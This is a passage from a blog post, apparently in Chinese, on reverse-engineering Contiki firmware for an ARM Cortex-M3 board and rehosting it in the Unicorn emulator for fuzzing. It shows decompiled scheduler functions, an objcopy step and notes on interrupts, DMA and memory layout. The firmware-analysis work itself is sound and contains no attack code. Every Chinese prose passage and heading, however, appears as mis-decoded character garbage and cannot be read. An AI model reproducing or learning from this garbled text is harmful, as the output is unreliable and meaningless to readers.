    <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">60</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="kr">__fastcall</span> <span class="nf">process_thread_tcpip_process</span><span class="p">(</span><span class="n">pt</span> <span class="o">*</span><span class="n">process_pt</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">tcpip_event</span> <span class="o">=</span> <span class="n">process_alloc_event</span><span class="p">();</span>
    <span class="n">etimer_set</span><span class="p">(</span><span class="o">&amp;</span><span class="n">periodic_0</span><span class="p">,</span> <span class="mh">0x40u</span><span class="p">);</span>
    <span class="n">uip_init</span><span class="p">();</span>
    <span class="n">init_1</span><span class="p">();</span>
    <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">==</span> <span class="mi">833</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">eventhandler</span><span class="p">(</span><span class="n">ev</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
<span class="nl">LABEL_4</span><span class="p">:</span>
    <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">833</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ÂêØÂä®ÂÆåËøô‰∏§‰∏™ process ‰πãÂêéÔºå‰∏Ä‰∏™ While Âæ™ÁéØÈáåÂºÄÂßã <code>process_run</code>„ÄÇÊ≥®ÊÑè start Âíå run ÁöÑÂå∫Âà´Ôºåstart ÂèØ‰ª•ËÆ§‰∏∫Âè™ÊòØÊää process ÁªìÊûÑ„ÄÅËµÑÊ∫êÂáÜÂ§áÂ•ΩÔºåËÄå run ÊâçÊòØÁúüÊ≠£Âú∞ËøêË°åÔºàÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØ‰øÆÊîπ process Áä∂ÊÄÅÔºåËÆ©ÂÆÉË∑ëËµ∑Êù•ÔºâÔºåÊâÄ‰ª•Êó¢ÁÑ∂ÂÆÉÊòØ‰∏Ä‰∏™Êìç‰ΩúÁ≥ªÁªüÔºåÈÇ£‰πàËøô‰∏™ <code>process_run</code> ÈáåÁêÜÂ∫îÂá∫Áé∞ÂÆÉÁöÑË∞ÉÂ∫¶ÁÆóÊ≥ï„ÄÇÊûúÁÑ∂Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">process_run</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">poll_requested</span> <span class="p">)</span>
    <span class="n">do_poll</span><span class="p">();</span>
  <span class="n">do_event</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">poll_requested</span> <span class="o">+</span> <span class="n">nevents</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>do_poll</code> ÈáåÂéªÈÅçÂéÜ <code>process_list</code>ÔºåÊ†πÊçÆÂâçÈù¢ÁöÑÁåúÊµãÈÇ£‰πàËøô‰∏™ process_list ÁêÜÂ∫îÊòØÂú®ÂâçÈù¢ÂêØÂä®ÁöÑËøáÁ®ã‰∏≠ÊûÑÂª∫ÁöÑ„ÄÇÊâÄ‰ª•Â∞±ÊòØ‰∏çÂÅúÂú∞ÈÅçÂéÜÊâÄÊúâ processÔºåÁúãÁúãÊúâÊ≤°ÊúâÂì™‰∏™ÈúÄË¶ÅÂêØÂä®‰∫Ü„ÄÇÂ¶ÇÊûúÊúâÔºåÈÇ£Â∞± <code>call_process</code>„ÄÇ<code>do_event</code> Èáå‰πüÊòØÁ±ª‰ºº„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">do_poll</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">process</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span> <span class="c1">// r4
</span><span class="c1"></span>
  <span class="n">poll_requested</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">process_list</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">next</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">needspoll</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">i</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="n">i</span><span class="o">-&gt;</span><span class="n">needspoll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">call_process</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x82u</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ÊÄª‰πãÊòØËµ∞Âà∞‰∫Ü <code>call_process</code>ÔºåËøôÈáåÈù¢‰∏Ä‰∏™Â§ßÂ§ßÂú∞ÂáΩÊï∞ÊåáÈíàËøêË°åÊ†áÂøóÁùÄÊàë‰ª¨ÂàÜÊûêÁöÑÁªìÊùü„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">call_process</span><span class="p">(</span><span class="n">process</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// r5
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="p">(</span><span class="o">*</span><span class="kr">thread</span><span class="p">)(</span><span class="n">pt</span> <span class="o">*</span><span class="p">,</span> <span class="n">process_event_t</span><span class="p">,</span> <span class="n">process_data_t</span><span class="p">);</span> <span class="c1">// r3
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">ev</span><span class="p">;</span>
    <span class="kr">thread</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="kr">thread</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="kr">thread</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">process_current</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
      <span class="n">p</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(((</span><span class="kt">int</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">pt</span> <span class="o">*</span><span class="p">,</span> <span class="n">process_event_t</span><span class="p">,</span> <span class="n">process_data_t</span><span class="p">))</span><span class="kr">thread</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">pt</span><span class="p">,</span> <span class="n">ev</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">1</span>
        <span class="o">||</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">131</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">exit_process</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="n">p</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Ëá≥Ê≠§ÔºåÊàë‰ª¨ÂèëÁé∞Ëøô‰∏™ firmware Áúã‰∏äÂéªÂ∞±ÊòØ‰∏çÂÅúÂú∞ÊâßË°å‰∏§‰∏™ÂáΩÊï∞„ÄÇÂΩìÁÑ∂Â¶ÇÊûúÊü•ÁúãÊâÄÊúâË∞ÉÁî®‰∫Ü <code>process_start</code> ÁöÑÂú∞ÊñπÂèØ‰ª•ÂèëÁé∞Ëøò‰ºöËøêË°åÂÖ∂‰ªñÂáΩÊï∞„ÄÇ</p>
<h4 id="‰∏Ä‰∫õÈ¢òÂ§ñËØù">‰∏Ä‰∫õÈ¢òÂ§ñËØùÔºü</h4>
<h6 id="dma">DMA</h6>
<p>DMA ÊòØÁ°¨‰ª∂Ôºå‰ºöÁª¥Êä§‰∏Ä‰∏™ dma bufferÔºåÊòØÂ§ñËÆæÂà∞ÂÜÖÂ≠òÁöÑÈ´òÈÄüÈÄöÈÅì„ÄÇ‰∏ÄËà¨ firmware Á®ãÂ∫èË¶Å‰ΩøÁî®Â§ñËÆæÊï∞ÊçÆÔºåÊòØ‰ªé MMIO ÈáåÊãøÊù•Áî®„ÄÇÊúâ‰∫Ü DMA ‰ª•Âêé‰∏çÁªèËøá MMIOÔºåDMA Áõ¥Êé•ÊîπÂèòÁâ©ÁêÜÂÜÖÂ≠òÔºåÂ∞ÜÂ§ñËÆæÁöÑÊï∞ÊçÆÂÜôËøõÂÜÖÂ≠òÔºåÂ≠òÂú® dma buffer ‰∏≠ÔºåËÄå firmware Á®ãÂ∫èÂè™ÈúÄË¶Å‰ªéËøô‰∏™ buffer ‰∏≠ÊãøÂ∞±Ë°å‰∫Ü„ÄÇËøôÂÖ∂‰∏≠ÁúÅÁï•‰∫Ü CPU ÁöÑÂêÑÁßçÊò†Â∞Ñ„ÄÅËØªÂÜôËøáÁ®ã„ÄÇ</p>
<h6 id="‰∏≠Êñ≠">‰∏≠Êñ≠</h6>
<p>‰∏≠Êñ≠ÂØπ‰∫éÁ≥ªÁªüÊù•ËØ¥ÊòØÈùûÂ∏∏ÈáçË¶ÅÁöÑÔºå‰∏Ä‰∏™ÊîØÊåÅ‰∏≠Êñ≠ÁöÑ CPU ‰ºöÂú®ÊØèÊù°ÊâßË°åÁªìÊùü‰πãÂêéÔºåÂéªÁúãÁúã‰∏≠Êñ≠Á°¨‰ª∂ÊòØÂê¶‰∫ßÁîü‰∏≠Êñ≠ÔºåÂ¶ÇÊûú‰∫ßÁîü‰∫ÜÂ∞±Âéª‰∏≠Êñ≠ÂêëÈáèË°®ÈáåÊâæÂØπÂ∫î‰∏≠Êñ≠ÂáΩÊï∞Âú∞ÂùÄ„ÄÇÂú®ÊâßË°å‰∏≠Êñ≠ÂáΩÊï∞‰πãÂâçÔºåÁî±<strong>Á°¨‰ª∂</strong>‰øùÂ≠ò‰∏ä‰∏ãÊñáÔºàÂØÑÂ≠òÂô®Á≠âÔºâ„ÄÇÊâßË°åÂÆå‰∏≠Êñ≠ÂáΩÊï∞‰πãÂêéÔºåÁî±<strong>Á°¨‰ª∂</strong>ÊÅ¢Â§ç‰∏ä‰∏ãÊñáÔºåÁªßÁª≠ÊâßË°å„ÄÇ</p>
<p>ËÄÉËôëËøôÊ†∑‰∏Ä‰∏™ÈúÄÊ±ÇÔºå‰∏Ä‰∏™ firmware ÊÉ≥Ë¶ÅÂ§ÑÁêÜÊé•Êî∂Âà∞ÁöÑÁΩëÁªúÂåÖ„ÄÇËÉΩÊÉ≥Âà∞ÁöÑÂÅöÊ≥ïÊòØÔºöfirmware ÊääÁΩëÁªúÂåÖÁöÑÂ§ÑÁêÜÂáΩÊï∞ÊîæÂú®ÁΩëÂç°ÁöÑ‰∏≠Êñ≠ÂáΩÊï∞‰∏≠„ÄÇÊØèÂΩìÁΩëÂç°Êé•Êî∂Âà∞ÁΩëÁªúÂåÖÊó∂ÔºåÂÆÉ‰∫ßÁîü‰∏≠Êñ≠ÔºåÂπ∂ÈÄöËøá DMA ÊàñËÄÖ MMIO ÊñπÂºèÂ∞ÜÁΩëÁªúÂåÖÂÜÖÂÆπÂèëÈÄÅÁªôÁ®ãÂ∫èÔºåCPU ÊçïËé∑‰∏≠Êñ≠Ë∑ëÂéªÊâßË°å‰∏≠Êñ≠ÂáΩÊï∞ÔºåÂ§ÑÁêÜÁΩëÁªúÂåÖÔºåÂÆûÁé∞ÈúÄÊ±Ç„ÄÇËøôÁßçÂìçÂ∫îÂºèÁöÑÂ§ÑÁêÜÊñπÊ≥ïÊó†ÁñëÊòØ‰∏≠Êñ≠Êú∫Âà∂‰∏ãÁöÑ‰∫ßÁâ©ÔºåÂáèÂ∞ë CPU Á©∫ËΩ¨„ÄÇ</p>
<p>ËøôÊ†∑ÂæàËá™ÁÑ∂‰ºöÊÉ≥Âà∞Ëøô‰∏™ÈóÆÈ¢òÔºåËøô‰∏™ Contiki ÁöÑ <code>process_thread_tcpip_process</code> ‰ªªÂä°ÔºåÁúã‰∏äÂéªÂ∞±ÊòØÂéªÂìçÂ∫î„ÄÅÂ§ÑÁêÜÁΩëÁªúÂåÖ„ÄÇ‰∏∫Âï•ÂÆÉË¢´ÊîæÂú® main ÂáΩÊï∞Èáå‰∏ÄÈÅçÂèà‰∏ÄÈÅçÊâßË°åÂë¢ÔºüËøôÂ∞ÜÈöèÁùÄÊú¨Êñá‰∏çÊñ≠Ê∑±ÂÖ•Âú∞ÂàÜÊûê‰ª£Á†ÅËÄåÊè≠ÂºÄË∞úÂ∫ï„ÄÇ</p>
<h2 id="re-host">Re-host</h2>
<p>ÁêÜËß£Â§ü‰∫ÜÊé•‰∏ãÊù•ÊâçÁúüÊ≠£ÂºÄÂßãÂπ≤Ê¥ªÂÑøÔºåÊàë‰ª¨Êé•‰∏ãÊù•ÁöÑÂ∑•‰ΩúÈáçÂøÉÊòØÁî® Unicorn ÊääËøô‰∏™ firmware Ë∑ëËµ∑Êù•„ÄÇ</p>
<h4 id="ÂáÜÂ§áÂ∑•‰Ωú">ÂáÜÂ§áÂ∑•‰Ωú</h4>
<h6 id="extract-raw-binary">extract raw binary</h6>
<p>‰ºóÊâÄÂë®Áü•Ôºå‰∏Ä‰∏™ ELF Âπ∂‰∏çÊòØ‰ªª‰ΩïÊÆµÈÉΩÊòØÊúâÁî®ÁöÑ„ÄÇÁâπÂà´ÊòØÂú®ÂµåÂÖ•ÂºèÁöÑÂú∫ÊôØ‰∏ãÔºåÂ≠òÂÇ®Á©∫Èó¥ÂØ∏ÂúüÂØ∏ÈáëÔºåÊääÊï¥‰∏™ ELF ÂÖ®ÈÉ®ÁÉßËøõÊùøÂ≠êÂ±ûÂÆûÊµ™Ë¥π„ÄÇÂú®Ëøô‰∏™Âú∫ÊôØ‰∏ãÔºåÊÑüËßâÊää .text Âíå .data ÊèêÂá∫Êù•Â∞±Ë∂≥Â§ü Unicorn ÂéªÊ®°Êãü‰∫Ü„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">x1do0@ubt2022:~/firmware_fuzz/labs/day6$ arm-none-eabi-objcopy -O binary ./hello-world.elf hello-world.bin
x1do0@ubt2022:~/firmware_fuzz/labs/day6$ ls -la
total 812
drwxrwxr-x 2 x1do0 x1do0   4096 Sep 28 11:29 .
drwxrwxr-x 5 x1do0 x1do0   4096 Sep 26 18:47 ..
-rwxrwxr-x 1 x1do0 x1do0 516096 Sep 28 11:29 hello-world.bin
-rwxrwxr-x 1 x1do0 x1do0 730104 Sep 28 11:26 hello-world.elf
</code></pre></td></tr></table>
</div>
</div><p>ÂèØ‰ª• xxd ÂØπÊØîÁúãÁúãÊèêÂèñÂá∫Êù•ÁöÑ binary Èïø‰ªÄ‰πàÊ†∑ÔºöÂºÄÂ§¥Â∞±ÊòØ <code>.text</code> ÊÆµÔºåËÄå <code>.data</code> ÊÆµË¢´ÊîæÂú®‰∫Ü 0x00012920 Â§Ñ„ÄÇËøôÈáåÂæàËá™ÁÑ∂‰ºöÊÉ≥Âà∞‰∏Ä‰∏™ÈóÆÈ¢òÔºåËøô‰∏§‰∏™ÊÆµÁöÑÁõ∏ÂØπ‰ΩçÁΩÆÁõ∏ÂØπ‰∫é ELF Êù•ËØ¥ÊòæÁÑ∂ÂèëÁîü‰∫ÜÊîπÂèò„ÄÇÈÇ£‰πà‰ª£Á†Å‰∏≠ËÆøÈóÆ <code>.data</code> Êó∂ÂØªÂùÄÂ≤Ç‰∏çÊòØÂ§±Êïà‰∫ÜÔºüÂâçÈù¢ÊèêÂà∞ <code>.data</code> ÊòØÂú® reset_handler ‰∏≠Êã∑Ë¥ùÁöÑÔºåËÄåËøôÈáå‰∏Ä‰∏™Á•ûÂ•áÁöÑÂú∞ÊñπÂ∞±Âú®‰∫éÔºåÊã∑Ë¥ùÁöÑÂú∞ÂùÄ <code>0x214920</code> ‰∏é <code>.text</code> ÊÆµÔºà0x202000ÂºÄÂßãÔºâ‰πãÈó¥Ê≠£Â•ΩÂ∑Æ‰∫Ü 0x00012920Ôºå‰ΩøÂæóÂú®Ê®°Êãü‰∏≠Âè™Ë¶ÅÊ≠£Á°ÆÂÆö‰Ωç‰∫Ü‰ª£Á†ÅÊÆµÔºåÈÇ£‰πàÂ∞±‰∏ç‰ºöÂá∫Áé∞‰ªª‰ΩïÈóÆÈ¢ò„ÄÇËøôÂà∞Â∫ïÊòØÂ∑ßÂêàËøòÊòØÂøÖÁÑ∂Ôºü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ble_l2cap_tx_process</span><span class="p">,</span> <span class="mh">0x214920</span><span class="p">,</span> <span class="mh">0x362u</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h6 id="arm-cortex-m3-memory-layout">ARM Cortex-M3 memory layout</h6>
<p>Ê∏ÖÊ∏ÖÊ•öÊ•öÔºåÊòéÊòéÁôΩÁôΩÔºö<a href="https://documentation-service.arm.com/static/5ea823e69931941038df1b11?token=" target="_blank" rel="noopener noreffer">memory map</a></p>
<p>ÂÖ∂‰∏≠ Peripheral Âå∫ÂüüÂ∞±ÊòØ MMIOÔºå‰∏ÄËà¨Êù•ËØ¥Êàë‰ª¨Âè™ÈúÄË¶ÅÂú® Unicorn ‰∏≠ map 0 - 0x60000000 Âíå 0xE0000000 ‰ª•‰∏äÁöÑÂå∫Âüü„ÄÇ</p>
<h6 id="Â¶Ç‰ΩïÊ®°Êãü‰∏≠Êñ≠">Â¶Ç‰ΩïÊ®°Êãü‰∏≠Êñ≠</h6>
<p>Unicorn ÊòØÂü∫‰∫é QEMU ÂºÄÂèëÁöÑÔºå‰ΩÜÂâçËÄÖÂ∞Ü QEMU ÁöÑ‰∏≠Êñ≠ÊîØÊåÅÂÆåÂÖ®ÂéªÊéâ‰∫ÜÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÁî®ËΩØ‰ª∂Êù•Ê®°Êãü‰∏≠Êñ≠ÂìçÂ∫îÁöÑËøáÁ®ã„ÄÇÁÆÄÂçïÊù•ÊÉ≥ÔºåÂΩì‰ª£Á†ÅÊ®°ÊãüÊâßË°åÂà∞Ë¶ÅÂèëÁîü‰∏≠Êñ≠ÁöÑ‰ΩçÁΩÆÂ§ÑÊó∂Ôºå‰øùÂ≠òÂØÑÂ≠òÂô®ÔºåË∑≥Âà∞ÂØπÂ∫î‰∏≠Êñ≠ÂáΩÊï∞ÔºåÊâßË°åÂÆåÊÅ¢Â§çÂØÑÂ≠òÂô®ÔºåË∑≥Âõû‰∏≠Êñ≠ÂèëÁîüÂ§ÑÊé•ÁùÄÊâßË°åÂç≥ÂèØ„ÄÇ</p>
<p>Unicorn Ê®°Êãü‰∏≠Êñ≠ÁöÑËøáÁ®ãÁñë‰ººÊòØÂ§ßÊúâÈó®ÈÅìÔºå‰ΩÜÊöÇ‰∏îÂÖàÊä±ÁùÄËÉΩÁî®Â∞±Ë°åÁöÑÂøÉÊÄÅÁªßÁª≠‰∏ãÂéªÔºå‰∏çÊ∑±ÂÖ•Á†îÁ©∂‰∫Ü„ÄÇ</p>
<h6 id="Â¶Ç‰ΩïÊ®°ÊãüÁ°¨‰ª∂">Â¶Ç‰ΩïÊ®°ÊãüÁ°¨‰ª∂</h6>
<p>‰∏Ä‰∏™Âõ∫‰ª∂‰∏äÁöÑÁ°¨‰ª∂ÔºåÊØîÂ¶Ç‰º†ÊÑüÂô®ÔºåÊî∂Âà∞‰∫ÜÊï∞ÊçÆÔºåÂÆÉË¶Å‰ªé MMIO ÂØÑÂ≠òÂô®ÈáåËØª„ÄÇÂ¶Ç‰ΩïÊ®°Êãü MMIO ÂØÑÂ≠òÂô®ËØªÂë¢ÔºüÊàë‰ª¨‰πüÁÆÄÂçïÂú∞ÊÉ≥ÔºåÊØèÂΩìËØªÊüê‰∫õÂú∞ÂùÄÊó∂Ôºå‰∏ªÂä® mem_write ‰∏Ä‰∏™ÈöèÊú∫ÂÄºÔºåÊ®°ÊãüÁ°¨‰ª∂Êï∞ÊçÆÂ∞±Â•Ω‰∫ÜÂêßÔºü</p>
<h6 id="Â¶Ç‰ΩïË∑≥ËøáÊüê‰∫õÂáΩÊï∞">Â¶Ç‰ΩïË∑≥ËøáÊüê‰∫õÂáΩÊï∞Ôºü</h6>
<p>Âú® hook code ÁöÑÊó∂ÂÄôÂèëÁé∞ÔºåÊúâ‰∫õÂáΩÊï∞ÂºÇÂ∏∏ÁÉ¶‰∫∫ÔºåÊØîÂ¶Ç <code>fade</code> ÂáΩÊï∞‰∏≠ÁöÑÂæ™ÁéØÂú®Ë¢´ hook ‰∏ä‰πãÂêé‰ΩøÂæóÊï¥‰∏™Ê®°ÊãüËøáÁ®ãÂèòÂæóÁ©∂ÊûÅÊÖ¢ÔºåËÄåÊòæÁÑ∂ËøôÂπ∂‰∏çÊòØ‰∏Ä‰∏™Êúâ‰ªÄ‰πà‰ΩúÁî®ÁöÑÂáΩÊï∞ÔºåÊâÄ‰ª•ÂæóÊÉ≥‰∏™ÂäûÊ≥ïÂú®Ê®°ÊãüÁöÑÊó∂ÂÄôÁõ¥Êé•Â∞ÜÂÖ∂Ë∑≥Ëøá„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">fade</span><span class="p">(</span><span class="n">leds_mask_t</span> <span class="n">l</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// r5
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// r4
</span><span class="c1"></span>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+4h] [bp-14h]
</span><span class="c1"></span>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">ia</span><span class="p">;</span> <span class="c1">// [sp+4h] [bp-14h]
</span><span class="c1"></span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">800</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">j</span> <span class="o">&gt;</span> <span class="mi">400</span> <span class="p">)</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="mi">800</span> <span class="o">-</span> <span class="n">j</span><span class="p">;</span>
    <span class="k">else</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
    <span class="n">leds_on</span><span class="p">(</span><span class="n">l</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
      <span class="p">;</span>
    <span class="n">leds_off</span><span class="p">(</span><span class="n">l</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">ia</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="mi">400</span> <span class="o">-</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="n">ia</span><span class="p">;</span> <span class="o">++</span><span class="n">ia</span> <span class="p">)</span>
      <span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ÂÖ∂ÂÆûÊÄùË∑Ø‰πüÈùûÂ∏∏ÁÆÄÂçïÔºåÂú®ÂºÄÂßãÊ®°Êãü‰πãÂâçÊääÂÆÉ patch ÊéâËÆ©ÂÆÉÊèêÂâçËøîÂõûÂ∞±Ë°å‰∫Ü„ÄÇËßÇÂØüÂáΩÊï∞‰ΩìÔºåËøõÂéªÁöÑÊó∂ÂÄôÂØÑÂ≠òÂô®ÂÖ•Ê†àÔºå‰∏ãÊãâ SPÔºåÂá∫Êù•ÁöÑÊó∂ÂÄô‰∏äÊãâ SP Âπ∂Â§çÂéüÂØÑÂ≠òÂô®„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
